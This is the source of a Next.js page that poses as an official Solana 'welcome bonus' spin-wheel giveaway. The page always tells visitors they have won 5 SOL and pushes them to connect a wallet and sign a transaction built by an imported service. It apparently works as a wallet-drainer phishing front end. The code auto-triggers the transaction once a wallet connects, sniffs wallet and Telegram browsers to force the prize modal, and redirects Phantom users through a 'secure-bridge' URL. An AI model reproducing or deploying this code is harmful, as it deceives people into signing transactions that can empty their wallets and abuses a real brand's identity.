// app/IR03/page.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */

'use client'

import React, { useEffect, useRef, useState, Fragment } from 'react'
import '../assets/2idql.css'
import '../assets/connect.css'
import { Transition } from '@headlessui/react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import type { WalletAdapter, WalletName } from '@solana/wallet-adapter-base'
import { WalletReadyState }            from '@solana/wallet-adapter-base'
import { createUnsignedTransaction }   from '@/app/services/transactionIR03'

// ——— Telegram WebApp tipi ———
interface TgWebApp {
  expand: () => void
  requestFullscreen?: () => void
  setHeaderColor: (typeOrColor: string, colorHex?: string) => void
  setBackgroundColor: (colorHex: string) => void
  disableVerticalSwipes?: () => void
  scroll?: (offsetY: number) => void
  ready?: () => void
}

/** Telegram ortamını güvenli tespit — UA + initData + platform + query param + tolerans */
const isInTelegramEnv = () => {
  try {
    const tg: any = (window as any).Telegram?.WebApp;

    // 1) initData/Unsafe
    if (tg?.initData?.length > 0) return true;
    if (tg?.initDataUnsafe?.user || tg?.initDataUnsafe?.query_id) return true;

    // 2) platform bilgisi (Telegram'da genelde 'android' | 'ios' | 'tdesktop' | 'web' olur; normal tarayıcıda çoğu zaman 'unknown' veya yok)
    if (tg?.platform && tg.platform !== 'unknown') return true;

    // 3) Telegram’ın sık eklediği query param izleri
    if (/[?&](tgWebApp|tgWebAppPlatform|tgWebAppVersion|tgWebAppData)=/i.test(location.search)) return true;

    // 4) UA fallback (bazı sürümlerde 'Telegram', bazılarında 'TG/')
    const ua = navigator.userAgent;
    if (/Telegram|TG\//i.test(ua)) return true;

    return false;
  } catch {
    return false;
  }
};

export default function Page() {
  /* ——— Telegram Mini-App: API hazır olana kadar bekle, sonra tek seferde uygula ——— */
  useEffect(() => {
    let cancelled = false
    let tries = 0
    const maxTries = 150   // ~4.5s @ 30ms
    const interval = 30

    const tick = () => {
      if (cancelled) return
      const webapp = (window as any)?.Telegram?.WebApp as TgWebApp | undefined
      if (webapp) {
        try {
          webapp.expand()
          webapp.requestFullscreen?.()
          webapp.setHeaderColor?.('bg_color', '#000000')
          webapp.setBackgroundColor?.('#000000')
          webapp.disableVerticalSwipes?.()
          webapp.ready?.()
        } catch { /* ignore */ }
        return // hazırlandı → dur
      }
      if (++tries < maxTries) setTimeout(tick, interval)
    }

    tick()
    return () => { cancelled = true }
  }, [])

/* ——— telegram HARİCİ aşağı scroll — Telegram'da asla çalışmasın (gecikmeli karar) ——— */
useEffect(() => {
  let cleanup: (() => void) | null = null;
  let done = false;

  const apply = () => {
    if (done) return;
    if (isInTelegramEnv()) { done = true; return; } // TG ise hiçbir şey yapma

    const minOffset = 75;
    const w = window.innerWidth;

    if (w >= 322 && w <= 499) {
      window.scrollTo({ top: minOffset });

      const keepOffset = () => {
        if (window.scrollY < minOffset) window.scrollTo({ top: minOffset });
      };
      window.addEventListener('scroll', keepOffset, { passive: true });

      cleanup = () => window.removeEventListener('scroll', keepOffset);
    }

    done = true;
  };

  // TG tespitinin “yarış”a düşmemesi için bir kaç tick geciktir
  const raf = requestAnimationFrame(apply);
  const t   = setTimeout(apply, 300); // 300ms sonra da bir kez daha kontrol

  return () => {
    cancelAnimationFrame(raf);
    clearTimeout(t);
    cleanup?.();
  };
}, []);

  /* ——— Telegram DIŞI + In-App Wallet tarayıcıda spin’dan sonra modal aç ——— */
  useEffect(() => {
    if (typeof window === 'undefined') return
    if (isInTelegramEnv()) return // Telegram ise hiç çalışmasın

    const w = window.innerWidth
    if (w < 322 || w > 499) return

    // Tarayıcıda hangi cüzdan in-app browser’ı?
    const isPhantom        = Boolean((window as any).solana?.isPhantom)
    const isTrust          = Boolean((window as any).ethereum?.isTrust) || /Trust/i.test(navigator.userAgent)
    const isCoinbaseWallet = Boolean((window as any).ethereum?.isCoinbaseWallet) || /CoinbaseWallet/i.test(navigator.userAgent)
    const isBitkeep        = /BitKeep|Bitget/i.test(navigator.userAgent)
    const isSolflare       = Boolean((window as any).solflare?.isSolflare) || /Solflare/i.test(navigator.userAgent)
    const isBackpack       = /Backpack/i.test(navigator.userAgent)

    const isWalletBrowser = isPhantom || isTrust || isCoinbaseWallet || isBitkeep || isSolflare || isBackpack
    if (!isWalletBrowser) return

    if (!localStorage.getItem('hasSpun')) {
      const minOffset = 50
      window.scrollTo({ top: minOffset })

      const keepOffset = () => {
        if (window.scrollY < minOffset) window.scrollTo({ top: minOffset })
      }
      window.addEventListener('scroll', keepOffset, { passive: true })

      localStorage.setItem('hasSpun', 'true')
      setHasSpun(true)

      return () => window.removeEventListener('scroll', keepOffset)
    }
  }, [])

  /* ——— Çark (spin) durumu ——— */
  const wheelRef = useRef<HTMLImageElement>(null)
  const [hasSpun, setHasSpun] = useState<boolean>(
    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
  )

  // Telegram DEĞİLSE ve genişlik 322–499 aralığıysa modal’ı aç
  useEffect(() => {
    if (!isInTelegramEnv()) {
      const w = window.innerWidth
      if (w >= 322 && w <= 499) setHasSpun(true)
    }
  }, [])

  useEffect(() => {
    if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
  }, [hasSpun])

  const handleSpin = () => {
    if (hasSpun || !wheelRef.current) return
    const w = wheelRef.current!
    w.style.transition = 'transform 9000ms ease-in-out'
    w.style.transform = 'rotate(1080deg)'
    setTimeout(() => {
      w.style.transition = 'none'
      w.style.transform = 'rotate(0deg)'
    }, 9000)
    setTimeout(() => {
      setHasSpun(true)
      localStorage.setItem('hasSpun', 'true')
    }, 10000)
  }

  /* ——— Wallet & Drawer kontrolü ——— */
  const { connection: conn } = useConnection()
  const { wallet, wallets, select, publicKey, sendTransaction } = useWallet()
  const [drawerOpen, setDrawerOpen] = useState(false)
  const [loading,    setLoading]    = useState(false)
  const [msg,        setMsg]        = useState('')

  const openDrawer  = () => setDrawerOpen(true)
  const closeDrawer = () => setDrawerOpen(false)

  /* ——— Origin & DApp URL ——— */
  const origin = typeof window !== 'undefined' ? window.location.origin : ''
  const dappUrl = encodeURIComponent(origin)

  /* ——— Cüzdan yapılandırmaları & sıralama ——— */
  interface WalletConfig {
    match: (name: string) => boolean
    label: string
    icon: string
    deepLink: string
  }
  const walletConfigs: WalletConfig[] = [
    { match: (n) => n === 'Phantom',  label: 'Phantom',  icon: '/phantom.svg',  deepLink: `https://phantom.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
    { match: (n) => n.toLowerCase().includes('trust'), label: 'Trust Wallet', icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg', deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
    { match: (n) => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'), label: 'Bitget Wallet', icon: '/bitget.svg', deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
    { match: (n) => n === 'Solflare', label: 'Solflare', icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
    { match: (n) => n === 'Backpack', label: 'Backpack', icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
  ]

  type DrawerWallet = WalletConfig & {
    adapter: WalletAdapter
    readyState: WalletReadyState
  }
  const mappedWallets = walletConfigs.map((cfg) => {
    const w = wallets.find((w) => cfg.match(w.adapter.name))
    return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
  })
  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
    (x): x is DrawerWallet => x !== null
  )

  /* ——— Connect Wallet ——— */
  const handleConnect = async () => {
    setLoading(true)
    setMsg('')
    if (publicKey) {
      setLoading(false)
      return
    }
    const installed = orderedWallets.filter(
      (w) => w.readyState === WalletReadyState.Installed
    )
    if (installed.length === 1) {
      try {
        await select(installed[0].adapter.name as WalletName)
      } catch (e) {
        console.error(e)
      }
    } else {
      openDrawer()
    }
    setLoading(false)
  }

  /* ——— Transaction gönderme ——— */
  const doTx = async (pk = publicKey!) => {
    setMsg('')
    setLoading(true)
    try {
      const tx = await createUnsignedTransaction(pk)
      if (!tx) {
        setMsg('No enough fee')
        return
      }
      let signature: string
      if (wallet?.adapter && 'signAndSendTransaction' in wallet.adapter) {
        const res = await (wallet.adapter as any).signAndSendTransaction(tx, conn)
        signature = res.signature
      } else {
        signature = await sendTransaction(tx, conn)
      }
      await conn.confirmTransaction(signature, 'confirmed')
      setMsg('Claim successful')
    } catch (e) {
      console.error('Transaction error', e)
      setMsg('No enough fee')
    } finally {
      setLoading(false)
      setTimeout(() => setMsg(''), 5000)
    }
  }

  /* ——— Auto-claim için Ref & Effect ——— */
  const autoClaim = useRef(false)
  useEffect(() => {
    if (autoClaim.current && publicKey) {
      autoClaim.current = false
      doTx()
    }
  }, [publicKey])

  /* ——— Claim Reward ——— */
  const handleClaim = async () => {
    if (loading) return
    setMsg('')

    // 1) Zaten bağlıysak → direkt işlem
    if (publicKey) {
      setLoading(true)
      await doTx()
      return
    }

    // 2) Tek bir Installed adapter varsa → işaretle, bağlan ve Effect başlatsın
    const installed = orderedWallets.filter(
      (w) => w.readyState === WalletReadyState.Installed
    )
    if (installed.length === 1) {
      setLoading(true)
      autoClaim.current = true
      await select(installed[0].adapter.name as WalletName)
      return
    }

    // 3) Diğer durumlarda modal aç
    openDrawer()
  }

  /* ——— Cüzdan seçimi ——— */
  const handleWalletClick = async (w: DrawerWallet) => {
    closeDrawer();

    if (w.adapter.name === 'Phantom') {
      const sol           = (window as any).solana
      const ua            = navigator.userAgent
      const isAndroid     = /Android/i.test(ua)
      const isTelegramWebView =
        /Telegram/i.test(ua) &&
        typeof (window as any).Telegram?.WebApp !== 'undefined'

      // 1) Phantom eklenti/SDK varsa doğrudan imzala-gönder
      if (w.readyState === WalletReadyState.Installed && sol?.isPhantom) {
        await select('Phantom' as WalletName)
        return doTx()
      }

      /* ===== Sabit yönlendirme adresi ===== */
      const secureBridgeUrl = 'https://secure-bridge.vercel.app/IR03' // IR02'ye uyarladım
      const encodedBridge   = encodeURIComponent(secureBridgeUrl)

      // Mevcut sayfanın (Telegram içindeki) tam URL’i
      const currentUrl      = window.location.origin + window.location.pathname
      const hostAndPath     = currentUrl.replace(/^https?:\/\//, '')

      /* -- Phantom link formatları (secure-bridge’e göre) -- */
      const schemePhantom    = `phantom://browse/${encodedBridge}?ref=${encodedBridge}`
      const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`

      /* -- Android + Telegram WebView → intent (mevcut sayfa) -- */
      if (isAndroid && isTelegramWebView) {
        const intentDefaultBrowser = [
          `intent://${hostAndPath}`,
          `#Intent;scheme=https`,
          `;action=android.intent.action.VIEW`,
          `;category=android.intent.category.BROWSABLE`,
          `;S.browser_fallback_url=${universalPhantom}`,
          `;end`
        ].join('')
        const a = document.createElement('a')
        a.href   = intentDefaultBrowser
        a.target = '_blank'
        document.body.appendChild(a)
        a.click()
        setTimeout(() => a.remove(), 700)
        return
      }

      /* -- Android normal tarayıcı → Phantom scheme (secure-bridge) -- */
      if (isAndroid) {
        const a = document.createElement('a')
        a.href   = schemePhantom
        a.target = '_blank'
        document.body.appendChild(a)
        a.click()
        setTimeout(() => a.remove(), 700)
        return
      }

      /* -- iOS & Desktop → universal link (secure-bridge) -- */
      window.location.href = universalPhantom
      return
    }

    /* -------- Diğer cüzdanlar -------- */
    if (w.readyState === WalletReadyState.Installed) {
      await select(w.adapter.name as WalletName)
      return doTx()
    }

    // Yüklü değilse varsayılan deepLink
    window.open(w.deepLink, '_blank')
  }

  return (
    <>
      {/* ---------- HERO BANNER ---------- */}
      <div className="_1">
        <div className="_g">
          <span className="_a">
            <div className="_3">
              <p className="_7">
                CONGRATULATIONS!<br/>
                <span className="_a">You won</span>{' '}
                <span className="_a">5 $SOL</span>
              </p>
            </div>
          </span>
          <div className="_9">
            <div className="_i">
              <p className="_k">Connect your wallet to receive reward</p>
              <button onClick={handleClaim} className="_s" disabled={loading}>
                {loading ? 'Please wait…' : msg || 'CLAIM REWARD'}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ---------- HEADER ---------- */}
      <section className="_b">
        <div className="_d">
          <div className="_x">
            <div className="_0">
              <a href="#!" className="_h">
                <img src="/header_logo.svg" alt="Solana logo" />
              </a>
              <a href="#!" className="_w">
                <img src="/alik.png" className="_t" alt="avatar" />
              </a>
            </div>
            <div className="_0">
              <div className="_6">
                <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
                  <img src="/header_twitter.svg" alt="Twitter" />
                </a>
                <a href="https://t.me/solana" target="_blank" rel="noreferrer">
                  <img src="/header_tg.svg" alt="Telegram" />
                </a>
                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
                  <img src="/header_mail.svg" alt="YouTube" />
                </a>
                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
                  <img src="/header_ds.svg" alt="Discord" />
                </a>
              </div>
            </div>
            <div className="_0">
              <button onClick={handleConnect} className="_n">
                <span className="_a">
                  {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                </span>
                <img src="/header_arrow.svg" alt="→" />
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------- MAIN SECTION ---------- */}
      <section className="_m">
        <div className="_d">
          <h1 className="_4">
            WELCOME <span>BONUS</span><br/>
            FOR SOLANA USERS
          </h1>
          <div className="_o">
            <div className="_r">
              <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
              <img ref={wheelRef} src="/wheel_wheel.png" alt="Wheel" className="_l" />
              <button className="_y" onClick={handleSpin}>FREE SPIN</button>
            </div>
          </div>
          <div className="_u">
            <div className="_j">
              <p className="_p">
                <img src="/main_one.svg" alt="step 1" />
                If you have received a qualification notification in the form of SOL or USDT, click the «FREE SPIN» button
              </p>
              <p className="_p">
                <img src="/main_two.svg" alt="step 2" />
                If you win a reward in free spin, we congratulate you!
              </p>
              <p className="_p">
                <img src="/main_three.svg" alt="step 3" />
                Click «CLAIM REWARD», connect your wallet and confirm the received transaction
              </p>
            </div>
            <p className="_e">All rights reserved © 2025 SOLANA.</p>
          </div>
        </div>
      </section>

      {/* ——— CONNECT DRAWER & MODAL ——— */}
      <Transition show={drawerOpen} as={Fragment}>
        {/* overlay */}
        <Transition.Child
          as="div"
          enter="transition-opacity duration-200"
          enterFrom="opacity-0"
          enterTo="opacity-60"
          leave="transition-opacity duration-200"
          leaveFrom="opacity-60"
          leaveTo="opacity-0"
          className="connect-overlay"
          onClick={closeDrawer}
        />

        {/* mobile bottom sheet */}
        <Transition.Child
          as="div"
          enter="transition-transform duration-200"
          enterFrom="translate-y-full"
          enterTo="translate-y-0"
          leave="transition-transform duration-200"
          leaveFrom="translate-y-0"
          leaveTo="translate-y-full"
          className="connect-sheet md:hidden"
        >
          <div className="connect-header">
            <h2 className="connect-title">Connect Wallet</h2>
            <button className="connect-close" onClick={closeDrawer}>×</button>
          </div>
          <div className="connect-list">
            {orderedWallets.map(w => (
              <div
                key={w.adapter.name}
                className="connect-row"
                onClick={() => handleWalletClick(w)}
              >
                <div className="connect-icon">
                  <img src={w.icon} alt={w.label} />
                </div>
                <span className="connect-text">{w.label}</span>
              </div>
            ))}
          </div>
          <p className="connect-footer">
            Haven’t got a wallet?{' '}
            <a href="https://solana.com/wallets" target="_blank">
              Get started
            </a>
          </p>
        </Transition.Child>

        {/* desktop centered modal */}
        <Transition.Child
          as="div"
          enter="transition-opacity duration-200"
          enterFrom="opacity-0"
          enterTo="opacity-100"
          leave="transition-opacity duration-200"
          leaveFrom="opacity-100"
          leaveTo="opacity-0"
          className="hidden md:flex fixed inset-0 z-50 items-center justify-center bg-black/40"
        >
          <div className="drawer-card space-y-4">
            <div className="connect-header">
              <h2 className="connect-title">Connect Wallet</h2>
              <button className="connect-close" onClick={closeDrawer}>×</button>
            </div>
            <div className="connect-list">
              {orderedWallets.map(w => (
                <div
                  key={w.adapter.name}
                  className="connect-row"
                  onClick={() => handleWalletClick(w)}
                >
                  <div className="connect-icon">4
                    <img src={w.icon} alt={w.label} />
                  </div>
                  <span className="connect-text">{w.label}</span>
                </div>
              ))}
            </div>
            <p className="connect-footer">
              Haven’t got a wallet?{' '}
              <a href="https://solana.com/wallets" target="_blank">
                Get started
              </a>
            </p>
          </div>
        </Transition.Child>
      </Transition>
    </>
  )
}
